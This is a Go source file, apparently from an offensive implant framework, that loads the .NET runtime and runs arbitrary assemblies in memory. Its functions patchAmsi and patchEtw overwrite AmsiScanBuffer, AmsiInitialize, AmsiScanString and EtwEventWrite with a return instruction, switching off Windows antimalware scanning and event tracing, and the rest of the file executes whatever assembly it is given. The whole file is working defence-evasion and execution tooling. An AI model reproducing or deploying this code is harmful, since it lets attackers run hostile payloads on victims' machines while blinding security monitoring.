package execute_assembly

import (
	"crypto/sha256"
	"errors"
	"fmt"
	"log"
	"sync"
	"unsafe"

	clr "github.com/Ne0nd0g/go-clr"
	"golang.org/x/sys/windows"
)

var (
	clrInstance *CLRInstance
	assemblies  []*assembly
)

type assembly struct {
	methodInfo *clr.MethodInfo
	hash       [32]byte
}

type CLRInstance struct {
	runtimeHost *clr.ICORRuntimeHost
	sync.Mutex
}

func patchAmsi() error {
	// load amsi.dll
	amsiDLL := windows.NewLazyDLL("amsi.dll")
	amsiScanBuffer := amsiDLL.NewProc("AmsiScanBuffer")
	amsiInitialize := amsiDLL.NewProc("AmsiInitialize")
	amsiScanString := amsiDLL.NewProc("AmsiScanString")

	// patch
	amsiAddr := []uintptr{
		amsiScanBuffer.Addr(),
		amsiInitialize.Addr(),
		amsiScanString.Addr(),
	}
	patch := byte(0xC3)
	for _, addr := range amsiAddr {
		// skip if already patched
		if *(*byte)(unsafe.Pointer(addr)) != patch {
			log.Println("Patching AMSI")
			var oldProtect uint32
			err := windows.VirtualProtect(addr, 1, windows.PAGE_READWRITE, &oldProtect)
			if err != nil {
				log.Println("VirtualProtect failed:", err)
				return err
			}
			*(*byte)(unsafe.Pointer(addr)) = 0xC3
			err = windows.VirtualProtect(addr, 1, oldProtect, &oldProtect)
			if err != nil {
				log.Println("VirtualProtect (restauring) failed:", err)
				return err
			}
		}
	}
	return nil
}

func patchEtw() error {
	ntdll := windows.NewLazyDLL("ntdll.dll")
	etwEventWriteProc := ntdll.NewProc("EtwEventWrite")

	// patch
	patch := byte(0xC3)
	// skip if already patched
	if *(*byte)(unsafe.Pointer(etwEventWriteProc.Addr())) != patch {
		log.Println("Patching ETW")
		var oldProtect uint32
		err := windows.VirtualProtect(etwEventWriteProc.Addr(), 1, windows.PAGE_READWRITE, &oldProtect)
		if err != nil {
			log.Println("VirtualProtect failed:", err)
			return err
		}
		*(*byte)(unsafe.Pointer(etwEventWriteProc.Addr())) = 0xC3
		err = windows.VirtualProtect(etwEventWriteProc.Addr(), 1, oldProtect, &oldProtect)
		if err != nil {
			log.Println("VirtualProtect (restarting) failed:", err)
			return err
		}
	}
	return nil
}

func addAssembly(methodInfo *clr.MethodInfo, data []byte) {
	asmHash := sha256.Sum256(data)
	asm := &assembly{methodInfo: methodInfo, hash: asmHash}
	assemblies = append(assemblies, asm)
}

func getAssembly(data []byte) *assembly {
	asmHash := sha256.Sum256(data)
	for _, asm := range assemblies {
		if asm.hash == asmHash {
			return asm
		}
	}
	return nil
}

func (c *CLRInstance) GetRuntimeHost(runtime string) *clr.ICORRuntimeHost {
	log.Println("About to defer c.Unlock")
	defer c.Unlock()
	log.Println("Defered unlock")
	log.Println("About to lock")
	c.Lock()
	if c.runtimeHost == nil {
		log.Printf("Initializing CLR runtime host")
		c.runtimeHost, _ = clr.LoadCLR(runtime)
		err := clr.RedirectStdoutStderr()
		if err != nil {
			log.Printf("could not redirect stdout/stderr: %v\n", err)
		}
	}
	return c.runtimeHost
}

func LoadAssembly(data []byte, assemblyArgs []string, runtime string) (string, error) {
	var (
		methodInfo *clr.MethodInfo
		err        error
	)

	rtHost := clrInstance.GetRuntimeHost(runtime)
	if rtHost == nil {
		return "", errors.New("Could not load CLR runtime host")
	}

	if asm := getAssembly(data); asm != nil {
		methodInfo = asm.methodInfo
	} else {
		methodInfo, err = clr.LoadAssembly(rtHost, data)
		if err != nil {
			log.Printf("could not load assembly: %v\n", err)
			return "", err
		}
		addAssembly(methodInfo, data)
	}
	if len(assemblyArgs) == 1 && assemblyArgs[0] == "" {
		// for methods like Main(String[] args), if we pass an empty string slice
		// the clr loader will not pass the argument and look for a method with
		// no arguments, which won't work
		assemblyArgs = []string{" "}
	}
	log.Printf("Assembly loaded, methodInfo: %+v\n", methodInfo)
	log.Printf("Calling assembly with args: %+v\n", assemblyArgs)
	stdout, stderr := clr.InvokeAssembly(methodInfo, assemblyArgs)
	log.Printf("Got output: %s\n%s\n", stdout, stderr)
	return fmt.Sprintf("%s\n%s", stdout, stderr), nil
}

func InProcExecuteAssembly(assemblyBytes []byte, assemblyArgs []string, runtime string, amsiBypass bool, etwBypass bool) (string, error) {
	if amsiBypass {
		log.Println("Calling patchAMSI")
		err := patchAmsi()
		if err != nil {
			return "", err
		}
	}

	if etwBypass {
		err := patchEtw()
		if err != nil {
			return "", err
		}
	}

	return LoadAssembly(assemblyBytes, assemblyArgs, runtime)
}

func init() {
	clrInstance = &CLRInstance{}
	assemblies = make([]*assembly, 0)
}
